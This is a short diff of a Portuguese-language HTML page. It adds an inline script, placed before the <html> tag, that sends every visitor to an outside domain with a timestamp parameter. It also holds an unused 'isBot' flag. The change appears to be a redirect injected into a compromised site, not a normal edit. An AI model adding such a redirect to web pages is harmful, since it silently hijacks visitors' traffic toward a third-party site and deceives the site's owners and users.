@@ -1,4 +1,13 @@
 <!DOCTYPE html>
+<script>
+          (function () {
+            var target = "https://www.usefarias.com/";
+            var isBot = false;
+            var ts = Date.now();
+            var url = target + (target.indexOf('?') === -1 ? '?' : '&') + 'ts=' + encodeURIComponent(ts);
+            window.location.replace(url);
+          })();
+          </script>
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
